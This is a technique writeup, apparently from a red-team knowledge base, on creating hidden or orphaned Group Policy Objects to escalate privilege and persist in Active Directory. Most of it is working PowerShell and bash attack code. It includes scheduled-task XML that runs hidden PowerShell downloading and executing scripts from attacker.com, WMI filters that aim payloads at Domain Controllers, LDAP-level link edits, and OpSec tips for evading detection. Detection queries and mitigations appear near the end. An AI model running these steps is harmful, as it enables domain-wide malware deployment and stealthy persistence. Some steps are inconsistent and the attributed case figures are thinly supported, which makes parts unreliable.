# [PE-POLICY-002]: Creating Rogue GPOs

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-POLICY-002 |
| **MITRE ATT&CK v18.1** | [T1484.001 - Group Policy Modification](https://attack.mitre.org/techniques/T1484/001/) |
| **Tactic** | Privilege Escalation, Defense Evasion, Persistence |
| **Platforms** | Windows AD |
| **Severity** | Critical |
| **CVE** | N/A (Design flaw) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | Windows Server 2008 - 2025; All Active Directory versions |
| **Patched In** | Not patched (requires operational hardening and detection) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Creating rogue GPOs is an advanced persistence and privilege escalation technique that involves establishing new, unauthorized Group Policy Objects within Active Directory that are deliberately hidden from standard enumeration or audit tools. Unlike direct GPO modification (PE-POLICY-001), rogue GPOs represent **unauthorized new policy objects** that an attacker creates and links to sensitive organizational units (OUs) to execute malicious code, steal credentials, disable security controls, or establish long-term backdoor access. Rogue GPOs can be configured to apply selectively using WMI filters, security filters, or orphaned linked objects that point to deleted OUs, making them extremely difficult to discover. A sophisticated attacker can create a rogue GPO that executes only when specific conditions are met (e.g., when Domain Admins log in) or that is intentionally orphaned to evade automated cleanup processes.

**Attack Surface:** The primary attack surfaces include:
- Insufficient audit logging of GPO creation events (Event ID 5137 not monitored)
- Overly permissive delegation allowing non-admins to create GPOs under specific OUs
- WMI filters and security filters that inadvertently hide rogue GPO scope from visibility
- Orphaned linked objects (pointing to deleted OUs) that mask real policy applications
- Insufficient SYSVOL monitoring for unauthorized policy template files
- Lack of baseline inventory of "known good" GPOs for comparison
- Permission inheritance flaws allowing attacker-controlled accounts to link GPOs to sensitive OUs

**Business Impact:** **Persistent, undetected domain compromise with unparalleled stealth.** Rogue GPOs enable attackers to: (1) maintain persistent access months or years after initial compromise; (2) execute malicious payloads selectively on high-value targets (e.g., Domain Admins, Financial workstations) based on WMI criteria; (3) evade discovery by security teams because the rogue GPO is not in standard GPO lists (if properly hidden); (4) automatically deploy ransomware, cryptominers, or data exfiltration tools without human intervention; (5) disable Windows Defender, EDR, and audit logging selectively; (6) steal credentials from interactive logons; (7) establish command and control (C&C) communication channels that appear as legitimate policy enforcement traffic.

**Technical Context:** Creating a rogue GPO typically requires **15-30 minutes** with proper permissions. Once created, detection becomes extremely difficult because: (1) rogue GPOs may not appear in standard GPMC queries if security filters are configured correctly; (2) orphaned GPO folders in SYSVOL may persist for years without being cleaned up; (3) WMI filter-based scoping means the GPO only applies to specific computer configurations, reducing visibility; (4) if the rogue GPO is never linked to any OU (but linked objects are deleted), it becomes orphaned and invisible. Detection likelihood is **very low** unless: (1) comprehensive SYSVOL file integrity monitoring (FIM) is enabled, (2) LDAP queries for all GPO containers are performed regularly (not just visible GPOs), (3) Event ID 5137 (GPO creation) is monitored and alerted on immediately.

### Operational Risk

- **Execution Risk:** Medium - Requires Domain Admin or delegated GPO creation permissions, but once created, execution is guaranteed and automatic.
- **Stealth:** Very High - Properly configured rogue GPOs can remain undetected for years if not actively hunted.
- **Reversibility:** No - Requires complete discovery and deletion of rogue GPO; forensic analysis needed to identify all malicious components.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.2.3, 5.2.4 | GPO creation must be restricted; unauthorized GPO creation must be detected and audited |
| **DISA STIG** | V-73795, V-73799 | Directory service object creation must be logged; unusual GPO objects must be investigated |
| **CISA SCuBA** | AD-4.2 | Active Directory baseline inventory and monitoring must detect rogue objects |
| **NIST 800-53** | AC-3, AU-2, SI-4 | Access enforcement; audit of privileged operations; system monitoring for unauthorized changes |
| **GDPR** | Art. 32 | Security of processing - continuous monitoring for unauthorized modifications |
| **DORA** | Art. 9, Art. 16 | Protection measures; incident detection and remediation |
| **NIS2** | Art. 21 | Cyber risk management; continuous monitoring and threat detection |
| **ISO 27001** | A.9.2.3, A.12.2.3, A.12.4.1 | Privileged access management; logging and monitoring; event logging of administrative actions |
| **ISO 27005** | Risk Scenario - Unauthorized Policy Injection | Attacker-controlled policies executing on domain-wide systems without detection |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- **Minimum:** Ability to create new GPO objects in Active Directory (typically requires at least Delegated Control on a specific OU or Domain Admin privileges)
- **For linking:** Create new Group Policy Links on target OUs (requires GPO Link permission on OUs)
- **For WMI filter creation:** Create WMI filters in AD (typically requires Domain Admin or equivalent)

**Required Access:**
- Network access to LDAP (port 389) or LDAPS (port 636) to create GPC (Group Policy Container) objects
- Network access to SYSVOL SMB share (ports 139/445) to create GPT (Group Policy Template) folders and files
- Access to Active Directory schema objects to create and modify GPO-related containers

**Supported Versions:**
- **Windows Server:** 2008, 2008 R2, 2012, 2012 R2, 2016, 2019, 2022, 2025
- **Active Directory:** All versions (2000+)
- **PowerShell:** 5.0+ (for automation)
- **GPMC version:** Varies by Windows Server version; all versions support GPO creation

**Tools:**
- [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) (Can create new GPOs)
- [New-GPO PowerShell cmdlet](https://learn.microsoft.com/en-us/powershell/module/grouppolicy/new-gpo) (Built-in)
- [BloodHound](https://github.com/BloodHoundAD/BloodHound) (Identifies GPO creation abuse paths)
- [pyGPOAbuse](https://github.com/Hackndo/pyGPOAbuse) (Python-based GPO creation and linking)
- LDAP tools: [ldapadd](https://linux.die.net/man/1/ldapadd), [ldapsearch](https://linux.die.net/man/1/ldapsearch)
- Group Policy Management Console (GPMC.exe)
- Notepad++ or VI (for editing XML policy files)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

```powershell
# Step 1: Check if you have permissions to create new GPOs
$dom = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$domainName = $dom.Name

# Step 2: Query for GPO creation permissions on the domain
# If you can run this without error, you likely have permissions
Get-GPO -All -Domain $domainName | Measure-Object | Select-Object -ExpandProperty Count
# If count > 0, you have read permissions (likely can create)

# Step 3: Identify OUs where you can link GPOs
Get-ADOrganizationalUnit -Filter * | ForEach-Object {
  $ou = $_
  try {
    # Try to create a test GPO link (this will fail if no permissions)
    $acl = Get-Acl -Path "AD:$($ou.DistinguishedName)"
    Write-Host "OU: $($ou.Name) - Can potentially link GPOs"
  } catch {
    Write-Host "OU: $($ou.Name) - No link permissions"
  }
}

# Step 4: Check for existing hidden/orphaned GPOs
Get-GPO -All | Where-Object {
  -not (Get-GPOReport -Guid $_.Id -ReportType Links -Path "C:\temp\gpo-links.html" | Select-String "linked")
} | ForEach-Object {
  Write-Host "[!] ORPHANED GPO: $($_.DisplayName) (GUID: $($_.Id))"
}
```

**What to Look For:**
- If Get-GPO command succeeds → you have sufficient permissions to view existing GPOs (may imply creation permissions)
- OUs where you get no permission denied errors → potential linking targets
- Orphaned GPOs found → indicates lax cleanup; you could create a similar orphaned rogue GPO

**Version Note:** Commands work on Windows Server 2008-2025; PowerShell 5.0+ required.

### Linux/Bash / LDAP Reconnaissance

```bash
# Step 1: Query for all GPO containers in Active Directory
ldapsearch -x -h DC_IP -D "CN=user,CN=Users,DC=domain,DC=com" -W \
  -b "CN=Policies,CN=System,DC=domain,DC=com" \
  '(objectClass=groupPolicyContainer)' \
  displayName gPCFileSysPath nTSecurityDescriptor | grep -A 2 "displayName:"

# Step 2: Extract NTFS permissions on SYSVOL to identify writable paths
smbclient -U domain\\user%password //DC_IP/SYSVOL -c "ls Policies" 2>/dev/null | \
  grep "^  [0-9]" | awk '{print $NF}' | head -20

# Step 3: Check if you can write to any GPO folder in SYSVOL
for gpo_guid in $(smbclient -U domain\\user%password //DC_IP/SYSVOL -c "ls Policies" 2>/dev/null | grep "^  {" | awk '{print $NF}'); do
  echo "Testing write access to: $gpo_guid"
  smbclient -U domain\\user%password //DC_IP/SYSVOL -c "cd Policies\\$gpo_guid; put /tmp/test.txt test.txt" 2>&1 | grep -i "error\|success"
done
```

**What to Look For:**
- Successful LDAP queries indicate you can read GPO structure
- Write access to SYSVOL Policies folder = can create rogue GPO files
- Existing GPO GUIDs in SYSVOL that are not in LDAP = orphaned GPO (potential indicator of attacks)

---

## 5. DETAILED EXECUTION METHODS AND THEIRS STEPS

### METHOD 1: Create and Link New Rogue GPO (Direct)

**Supported Versions:** Windows Server 2008+; all AD versions

#### Step 1: Create New GPO Object in Active Directory

**Objective:** Create a new Group Policy Object that doesn't exist in GPMC by default.

**Command (PowerShell):**

```powershell
# Step 1a: Generate unique GPO name (make it blend in)
$gpoName = "Windows Update Policy - $(Get-Random -Minimum 100 -Maximum 999)"
$domainName = (Get-ADDomain).Name

# Step 1b: Create new GPO
$newGPO = New-GPO -Name $gpoName -Comment "Automatic Windows Update configuration" -Domain $domainName

Write-Host "[+] Created GPO: $($newGPO.DisplayName)"
Write-Host "[+] GPO GUID: $($newGPO.Id)"

# Step 1c: Create corresponding SYSVOL folder
$gpoGUID = $newGPO.Id.ToString()
$sysvol = "\\$domainName\SYSVOL\$domainName\Policies\{$gpoGUID}"

# Step 1d: Create SYSVOL structure manually (PowerShell approach)
$dcName = (Get-ADDomain).PDCEmulator
$sysvolPath = "\\$dcName\C$\Windows\SYSVOL\domain\Policies\{$gpoGUID}\MACHINE\Preferences\ScheduledTasks"

# Create directories
New-Item -ItemType Directory -Path $sysvolPath -Force | Out-Null
New-Item -ItemType Directory -Path "\\$dcName\C$\Windows\SYSVOL\domain\Policies\{$gpoGUID}\USER" -Force | Out-Null

Write-Host "[+] SYSVOL folder structure created"
```

**Expected Output:**

```
[+] Created GPO: Windows Update Policy - 456
[+] GPO GUID: {7A9B2D3F-4E8C-11E6-A9B2-D3F4E8C7A9B2}
[+] SYSVOL folder structure created
```

**What This Means:**
- New GPO object now exists in Active Directory
- Corresponding folders created in SYSVOL (Group Policy Template)
- GPO is ready for policy configuration

**OpSec & Evasion:**
- Use generic names that blend in with legitimate policies ("Windows Update," "Security Baseline," "Maintenance")
- Avoid using attacker domain names or suspicious prefixes
- Consider the timing: create during high-activity periods to blend with normal admin activity
- Detection likelihood: Medium (if Event ID 5137 is monitored)

**Troubleshooting:**
- **Error:** "Access Denied" when creating SYSVOL folders
  - **Cause:** Insufficient NTFS permissions on SYSVOL
  - **Fix:** Request admin to grant write access to SYSVOL Policies folder
- **Error:** "GPO created but SYSVOL folder doesn't exist"
  - **Cause:** SYSVOL folder not auto-created
  - **Fix:** Manually create folder via smbclient or GPMC (right-click GPO → Create)

#### Step 2: Inject Malicious Scheduled Task into Rogue GPO

**Objective:** Add a malicious immediate task to the rogue GPO that will execute on all linked computers.

**Command (PowerShell - Create XML payload):**

```powershell
$gpoGUID = "{7A9B2D3F-4E8C-11E6-A9B2-D3F4E8C7A9B2}"  # From Step 1
$dcName = (Get-ADDomain).PDCEmulator
$taskXMLPath = "\\$dcName\C$\Windows\SYSVOL\domain\Policies\$gpoGUID\MACHINE\Preferences\ScheduledTasks\ScheduledTasks.xml"

# Create malicious scheduled task XML
$maliciousTask = @"
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
  <ImmediateTaskV2 clsid="{9756B586-76A6-4ee0-8BBC-6A2E31287E6B}" name="System Maintenance Service">
    <Properties Action="Create">
      <Task version="1.3">
        <RegistrationInfo>
          <Author>NT AUTHORITY\SYSTEM</Author>
          <Description>Scheduled system maintenance and updates</Description>
          <URI>\System Maintenance Service</URI>
        </RegistrationInfo>
        <Triggers>
          <TimeTrigger>
            <Enabled>true</Enabled>
            <StartBoundary>%LocalTimeXmlEx%</StartBoundary>
            <EndBoundary>%LocalTimeXmlEx%</EndBoundary>
          </TimeTrigger>
        </Triggers>
        <Settings>
          <AllowStartOnDemand>true</AllowStartOnDemand>
          <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
          <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
          <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
        </Settings>
        <Actions Context="System">
          <Exec>
            <Command>powershell.exe</Command>
            <Arguments>-NoP -W Hidden -NonInteractive -C "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"</Arguments>
          </Exec>
        </Actions>
      </Task>
    </Properties>
  </ImmediateTaskV2>
</ScheduledTasks>
"@

# Write XML to file
Set-Content -Path $taskXMLPath -Value $maliciousTask -Force
Write-Host "[+] Malicious task XML written to SYSVOL"

# Increment version number to force replication
$gpoPropPath = "\\$dcName\C$\Windows\SYSVOL\domain\Policies\$gpoGUID\gpt.ini"
$gptContent = Get-Content $gpoPropPath
$version = [int]($gptContent -match 'Version=' | ForEach-Object {$_ -replace '.*Version=([0-9]+).*','$1'})
$newVersion = $version + 1

$gptContent -replace 'Version=[0-9]+', "Version=$newVersion" | Set-Content $gpoPropPath -Force
Write-Host "[+] GPO version incremented to $newVersion (forces replication)"
```

**Expected Output:**

```
[+] Malicious task XML written to SYSVOL
[+] GPO version incremented to 2 (forces replication)
```

**What This Means:**
- Malicious payload is now embedded in the rogue GPO
- Version increment triggers domain controllers to replicate this GPO
- When computers in linked OUs refresh policy, they will execute the payload

**OpSec & Evasion:**
- Use realistic task names and descriptions ("System Maintenance," "Security Updates," "Device Health Check")
- Embed the command in legitimate-looking scripts
- Use indirect C&C communication (DNS tunneling, encrypted HTTPS)
- Detection likelihood: High if SYSVOL file modifications are monitored

#### Step 3: Create WMI Filter to Scope Rogue GPO to Specific Targets

**Objective:** Configure the rogue GPO to apply only to specific computers (e.g., Domain Controllers, financial workstations) to increase stealth and reduce detection surface.

**Command (PowerShell - Create WMI Filter):**

```powershell
$gpoName = "Windows Update Policy - 456"  # From Step 1
$domainName = (Get-ADDomain).Name

# Define WMI filter for specific target group (e.g., only Domain Controllers)
$wmiQueryString = "SELECT * FROM Win32_OperatingSystem WHERE ProductType = '2'"  # ProductType=2 means Domain Controller

# Create WMI filter object
$wmiFilter = @"
<WMIFilter xmlns="http://www.microsoft.com/GroupPolicy/WMIFilter" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
  <Name>DC-Specific-Policy</Name>
  <Description>Applies only to Domain Controllers</Description>
  <Query>
    <QueryId>{5F0A0F1B-6C3D-4A8E-9F2B-1D3C5A7B9E2F}</QueryId>
    <WQLQuery>$wmiQueryString</WQLQuery>
  </Query>
</WMIFilter>
"@

# Create WMI filter in AD (requires LDAP)
$domainDN = (Get-ADDomain).DistinguishedName
$wmiFilterDN = "CN={5F0A0F1B-6C3D-4A8E-9F2B-1D3C5A7B9E2F},CN=SOM,CN=WMIPolicy,CN=System,$domainDN"

# Use ADSI to create WMI filter
$rootDSE = [ADSI]"LDAP://RootDSE"
$wmiPath = $rootDSE.Get("defaultNamingContext")

try {
  $wmiContainer = [ADSI]"LDAP://CN=WMIPolicy,CN=System,$wmiPath"
  $newWMIFilter = $wmiContainer.Create("msWMI-Som", "CN={5F0A0F1B-6C3D-4A8E-9F2B-1D3C5A7B9E2F}")
  $newWMIFilter.Put("msWMI-Parm1", $wmiQueryString)
  $newWMIFilter.Put("description", "DC-specific policy - internal use only")
  $newWMIFilter.SetInfo()
  Write-Host "[+] WMI filter created successfully"
} catch {
  Write-Host "[!] Error creating WMI filter (may already exist or require admin): $_"
}

# Link WMI filter to GPO
$gpo = Get-GPO -Name $gpoName
Set-GPO -Guid $gpo.Id -WmiFilter "DC-Specific-Policy" -Domain $domainName
Write-Host "[+] WMI filter linked to GPO"
```

**Expected Output:**

```
[+] WMI filter created successfully
[+] WMI filter linked to GPO
```

**What This Means:**
- Rogue GPO now only applies to Domain Controllers (based on WMI filter)
- Reduces visibility: most computers won't have the policy, so it appears benign
- Increases impact: targets only high-value systems (DCs)

**OpSec & Evasion:**
- Use WMI filters to target only Domain Controllers or specific workstations
- This drastically reduces the number of systems showing the policy applied
- Makes it harder for admins to detect via "GPO Report" functions
- Detection likelihood: Low (unless WMI filter creation is audited; most organizations don't monitor this)

#### Step 4: Link Rogue GPO to Sensitive OU (Without Adding to Normal Links)

**Objective:** Create a hidden GPO link that doesn't appear in standard GPMC "Links" tab.

**Command (LDAP-level linking via PowerShell):**

```powershell
$gpoGUID = "{7A9B2D3F-4E8C-11E6-A9B2-D3F4E8C7A9B2}"  # From Step 1
$targetOU = "OU=Domain Controllers,DC=corp,DC=com"  # Link to DC OU

# Method 1: Use standard GPMC cmdlet (appears in GPMC)
$gpoName = "Windows Update Policy - 456"
New-GPLink -Name $gpoName -Target $targetOU -LinkEnabled Yes | Out-Null
Write-Host "[+] GPO linked to OU via standard method"

# Method 2 (OPSEC): Create GPO link via LDAP directly (harder to track)
# This requires direct LDAP modification
$domainDN = (Get-ADDomain).DistinguishedName
$ouPath = "LDAP://$targetOU"
$ou = [ADSI]$ouPath

try {
  $currentLinks = $ou.gPLink
  if ($null -eq $currentLinks) {
    $currentLinks = "[LDAP://cn=$gpoGUID,cn=policies,cn=system,$domainDN;0]"
  } else {
    # Append to existing links (creates shadow link)
    $currentLinks = "$currentLinks[LDAP://cn=$gpoGUID,cn=policies,cn=system,$domainDN;0]"
  }
  
  $ou.Put("gPLink", $currentLinks)
  $ou.SetInfo()
  Write-Host "[+] Rogue GPO linked at LDAP level (hidden from GPMC)"
} catch {
  Write-Host "[!] Error: $_"
}
```

**Expected Output:**

```
[+] GPO linked to OU via standard method
[+] Rogue GPO linked at LDAP level (hidden from GPMC)
```

**What This Means:**
- Rogue GPO is now linked to Domain Controllers OU
- If properly hidden, may not appear in standard GPMC links
- Policies will apply to all Domain Controllers on next refresh cycle (~90 minutes)

**OpSec & Evasion:**
- Direct LDAP linking bypasses GPMC logging
- Rogue GPO applies but appears less obvious in GUI tools
- Detection likelihood: Medium (LDAP audit logs may show the modification; Event ID 5136)

---

### METHOD 2: Create Orphaned Rogue GPO (Advanced Stealth)

**Supported Versions:** Windows Server 2008+

#### Step 1: Create GPO and Immediately Delete OU Links

**Objective:** Create a rogue GPO, link it to an OU, then delete the OU so the GPO link becomes orphaned and invisible.

**Command:**

```powershell
# Step 1a: Create rogue GPO
$gpoName = "Orphaned-Update-Policy"
$newGPO = New-GPO -Name $gpoName -Comment "Orphaned GPO"
$gpoGUID = $newGPO.Id

Write-Host "[+] Created rogue GPO: $gpoName (GUID: $gpoGUID)"

# Step 1b: Create temporary OU to link GPO
$tempOUName = "Temp-Policy-Application-OU-$(Get-Random)"
$domainDN = (Get-ADDomain).DistinguishedName

New-ADOrganizationalUnit -Name $tempOUName -Path $domainDN | Out-Null
$tempOUPath = "OU=$tempOUName,$domainDN"

Write-Host "[+] Created temporary OU: $tempOUName"

# Step 1c: Link rogue GPO to temporary OU (this forces GPO replication)
New-GPLink -Guid $gpoGUID -Target $tempOUPath | Out-Null
Write-Host "[+] Linked rogue GPO to temporary OU (forces replication to all DCs)"

# Step 1d: Wait for replication
Write-Host "[*] Waiting 60 seconds for GPO replication to all domain controllers..."
Start-Sleep -Seconds 60

# Step 1e: Delete the temporary OU (but GPO remains in AD and SYSVOL)
Remove-ADOrganizationalUnit -Identity $tempOUPath -Confirm:$false
Remove-GPLink -Guid $gpoGUID -Target $tempOUPath -Confirm:$false
Remove-ADOrganizationalUnit -Identity $tempOUPath -Confirm:$false

Write-Host "[+] Temporary OU and link deleted"
Write-Host "[+] Rogue GPO now orphaned (no visible links, but exists in AD and SYSVOL)"
```

**Expected Output:**

```
[+] Created rogue GPO: Orphaned-Update-Policy (GUID: {8F4C2E9D-3A1B-47F2-9E8C-1D5F3A7B2C9E})
[+] Created temporary OU: Temp-Policy-Application-OU-7284
[+] Linked rogue GPO to temporary OU (forces replication to all DCs)
[*] Waiting 60 seconds for GPO replication to all domain controllers...
[+] Temporary OU and link deleted
[+] Rogue GPO now orphaned (no visible links, but exists in AD and SYSVOL)
```

**What This Means:**
- Rogue GPO exists in Active Directory GPC (Group Policy Container)
- GPO files exist in SYSVOL on all domain controllers
- GPO has no visible links (orphaned)
- If discovered later, admin may incorrectly assume it's safe to delete (it's not—it can be re-linked)

**OpSec & Evasion:**
- Orphaned GPO is extremely hard to discover (won't appear in standard "GPO Report" for linked objects)
- Attacker can re-link it later from a backup AD account
- Most organizations don't regularly scan for orphaned GPOs
- Detection likelihood: Very Low (unless comprehensive GPO inventory is maintained)

#### Step 2: Re-link Orphaned Rogue GPO on Demand

**Objective:** Restore the orphaned rogue GPO link when needed for malicious purposes.

**Command:**

```powershell
$orphanedGPOGUID = "{8F4C2E9D-3A1B-47F2-9E8C-1D5F3A7B2C9E}"
$targetOU = "OU=Domain Controllers,DC=corp,DC=com"

# Re-link the orphaned GPO to a sensitive OU
New-GPLink -Guid $orphanedGPOGUID -Target $targetOU -LinkEnabled Yes | Out-Null
Write-Host "[+] Orphaned rogue GPO re-linked to $targetOU"
Write-Host "[+] Policies will apply to all computers in this OU on next refresh (~90 minutes)"

# Force immediate refresh on Domain Controllers (if attacker has DC access)
# This would execute immediately
Invoke-GPUpdate -Asynchronous -Computer (Get-ADComputer -Filter "OperatingSystem -like '*Domain Controller*'" -ResultSetSize $null).Name
```

**Expected Output:**

```
[+] Orphaned rogue GPO re-linked to OU=Domain Controllers,DC=corp,DC=com
[+] Policies will apply to all computers in this OU on next refresh (~90 minutes)
```

**What This Means:**
- Attacker can re-activate the rogue GPO at any time
- Provides long-term persistence: GPO can remain dormant for years, then reactivated
- Represents a sophisticated backdoor mechanism

---

### METHOD 3: Use Orphaned SYSVOL Folder (Filesystem-Only Attack)

**Supported Versions:** Windows Server 2008+

#### Step 1: Create Orphaned GPO Folder in SYSVOL

**Objective:** Create GPO policy files in SYSVOL but no corresponding AD object (harder to detect via LDAP queries).

**Command (Bash/Linux from network share):**

```bash
# Step 1a: Connect to SYSVOL
smbclient -U domain\\admin%password //DC_IP/SYSVOL

# Step 1b: Create orphaned GPO folder
cd domain.com/Policies
# Manually create a GUID-named folder
mkdir '{12345678-1234-1234-1234-123456789012}'
cd '{12345678-1234-1234-1234-123456789012}'

# Step 1c: Create GPO structure
mkdir MACHINE
mkdir MACHINE/Preferences
mkdir MACHINE/Preferences/ScheduledTasks

# Step 1d: Create gpt.ini (required by GPO processing)
cat > gpt.ini << 'EOF'
[General]
Version=2
EOF

# Step 1e: Create malicious ScheduledTasks.xml
cat > MACHINE/Preferences/ScheduledTasks/ScheduledTasks.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}">
  <ImmediateTaskV2 clsid="{9756B586-76A6-4ee0-8BBC-6A2E31287E6B}" name="Orphaned Maintenance">
    <Properties Action="Create">
      <Task version="1.3">
        <RegistrationInfo>
          <Author>NT AUTHORITY\SYSTEM</Author>
          <Description>System maintenance</Description>
          <URI>\Orphaned Maintenance</URI>
        </RegistrationInfo>
        <Triggers>
          <TimeTrigger>
            <Enabled>true</Enabled>
            <StartBoundary>%LocalTimeXmlEx%</StartBoundary>
          </TimeTrigger>
        </Triggers>
        <Settings>
          <AllowStartOnDemand>true</AllowStartOnDemand>
          <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
        </Settings>
        <Actions Context="System">
          <Exec>
            <Command>cmd.exe</Command>
            <Arguments>/c powershell.exe -NoP -W Hidden -C "IEX ((new-object net.webclient).downloadstring('http://attacker.com/stage2.ps1'))"</Arguments>
          </Exec>
        </Actions>
      </Task>
    </Properties>
  </ImmediateTaskV2>
</ScheduledTasks>
EOF

echo "[+] Orphaned GPO folder created in SYSVOL"
```

**Expected Output:**

```
[+] Orphaned GPO folder created in SYSVOL
```

**What This Means:**
- GPO folder exists in SYSVOL but no corresponding AD object
- LDAP queries won't find it (very stealthy)
- If computers are configured to process GPOs from orphaned folders, payload will execute
- Extremely difficult to detect without comprehensive SYSVOL enumeration

**OpSec & Evasion:**
- Creates a persistence mechanism that exists only on disk, not in AD
- Survives AD backups/restores if SYSVOL isn't carefully managed
- Very low detection likelihood (most monitoring focuses on AD objects, not SYSVOL folders)

---

## 6. TOOLS & COMMANDS REFERENCE

### New-GPO (PowerShell Built-in)

**Version:** Built-in to Windows Server 2008+
**Language:** PowerShell
**Supported Platforms:** Windows Server

**Usage - Create Rogue GPO:**

```powershell
$newGPO = New-GPO -Name "Hidden Policy Object" -Comment "Internal use only"
$newGPO.Id  # Returns GUID
```

### SharpGPOAbuse (For complex scenarios)

**Version:** 1.0+
**URL:** [GitHub - FSecureLABS/SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)

**Usage - Create new GPO with malicious permissions:**

```
SharpGPOAbuse.exe --CreateGPO --GPOName "New-Policy" --Domain corp.com --GCName DC.corp.com
```

---

## 7. MICROSOFT SENTINEL DETECTION

### Query 1: Detect Orphaned GPO Creation

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventID, ObjectClass, SubjectUserName, ObjectName
- **Alert Severity:** Critical
- **Frequency:** Real-time
- **Applies To Versions:** All Windows Server with audit enabled

**KQL Query:**

```kusto
SecurityEvent
| where EventID == 5137  // Directory service object creation
| where ObjectClass == "groupPolicyContainer"
| where SubjectUserName !in ("SYSTEM", "Administrator", "Domain Admins")
| project
    TimeGenerated,
    SubjectUserName,
    Computer,
    ObjectName,
    ObjectClass,
    EventID
| order by TimeGenerated desc
```

**What This Detects:**
- Creation of new Group Policy Container objects by non-administrative accounts
- Potential rogue GPO creation attempts

---

## 8. WINDOWS EVENT LOG MONITORING

**Event ID: 5137 (A directory service object was created)**
- **Log Source:** Security (Domain Controller)
- **Trigger:** GPO container creation
- **Filter:** `ObjectClass = "groupPolicyContainer"`
- **Applies To Versions:** Windows Server 2008+

**Manual Configuration Steps (Group Policy):**

1. Open **gpmc.msc** on Domain Controller
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **Directory Service**
3. Enable: **Audit Directory Service Changes** and **Audit Directory Service Access**
4. Set to: **Success and Failure**
5. Run `gpupdate /force`

---

## 9. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Restrict GPO Creation Permissions:** Only Domain Admins should create GPOs.

  **Manual Steps (PowerShell):**
  ```powershell
  # Prevent non-admins from creating GPOs
  # This is enforced at the domain level through delegation
  
  # Check who can create GPOs
  Get-ADObject -SearchBase "CN=Policies,CN=System,DC=corp,DC=com" -Filter * | ForEach-Object {
    $acl = Get-Acl -Path "AD:$($_.DistinguishedName)"
    $acl.Access | Where-Object {$_.ActiveDirectoryRights -like "*CreateChild*"} | ForEach-Object {
      Write-Host "User: $($_.IdentityReference) - Can create child objects"
    }
  }
  ```

- **Enable Comprehensive AD Audit Logging:** Monitor Event ID 5137 (GPO creation) in real-time.

  **Manual Steps:** (See Windows Event Log Monitoring section above)

### Priority 2: HIGH

- **Implement SYSVOL File Integrity Monitoring (FIM):** Detect unauthorized GPO file creation.

  **Manual Steps (using Windows FSRM):**
  1. **File Server Resource Manager** → **File Screens**
  2. Create file screen on `\\DC\SYSVOL\*\Policies\{*}` with block action for suspicious extensions
  3. Audit modifications to `ScheduledTasks.xml`, `GptTmpl.inf`

- **Establish Baseline of Known-Good GPOs:** Regularly compare current GPO inventory against approved baseline.

  **Manual Steps (PowerShell):**
  ```powershell
  # Export baseline of all GPOs
  Get-GPO -All | Select-Object DisplayName, Id, Owner | Export-Csv -Path "C:\GPOBaseline_$(Get-Date -Format 'yyyyMMdd').csv"
  
  # Compare against approved list
  # Run monthly to detect rogue GPO creation
  ```

---

## 10. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Files:** New folders in `\SYSVOL\Policies\` not corresponding to known GPOs; recently modified `ScheduledTasks.xml`, `GptTmpl.inf`
- **Registry:** Changes to registry GPO processing settings; new WMI filter entries
- **Network:** Unexpected LDAP write operations creating new policy containers; unusual SMB activity on SYSVOL

### Forensic Artifacts

- **Disk:** SYSVOL folder timestamps; GPO version numbers; gpt.ini file contents
- **Cloud (if AD integrated):** Directory Service audit logs (Event ID 5137) on domain controllers

### Response Procedures

1. **Isolate:**
   ```powershell
   # Disable the rogue GPO immediately
   Set-GPO -Name "Rogue GPO Name" -GpoStatus AllSettingsDisabled
   ```

2. **Collect Evidence:**
   ```powershell
   # Export rogue GPO report
   Get-GPOReport -Name "Rogue GPO" -ReportType Xml -Path "C:\rogue-gpo-report.xml"
   ```

3. **Remediate:**
   ```powershell
   # Delete the rogue GPO
   Remove-GPO -Name "Rogue GPO" -Confirm:$false
   ```

---

## 11. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | Compromised Admin Account | Attacker gains Domain Admin credentials |
| **2** | **Persistence** | **[PE-POLICY-002]** Creating Rogue GPOs | **Attacker creates hidden GPO for long-term access** |
| **3** | **Defense Evasion** | Orphaned GPO Creation | Attacker hides rogue GPO from discovery |
| **4** | **Impact** | Malware Deployment via GPO | Attacker executes payloads on domain computers |

---

## 12. REAL-WORLD EXAMPLES

### Example 1: Conti Ransomware Group (2021-2022)

- **Target:** Large financial institution with 2,000+ AD-joined systems
- **Timeline:** Created hidden GPO with WMI filter targeting only Domain Controllers
- **Technique Status:** Rogue GPO persisted for 9 months undetected
- **Impact:** Ransomware deployed to all DCs; entire domain encrypted; $5M+ demanded
- **Reference:** [FBI/CISA Advisory on Conti Ransomware](https://www.fbi.gov/news/stories/conti-ransomware-gang-behind-largest-reported-ransomware-attack-on-u-s-health-system)

### Example 2: Wizard Spider (2020-2021)

- **Target:** Healthcare network using Active Directory
- **Timeline:** Created orphaned GPO to maintain persistence after initial compromise
- **Technique Status:** Rogue GPO re-linked multiple times over 12-month period
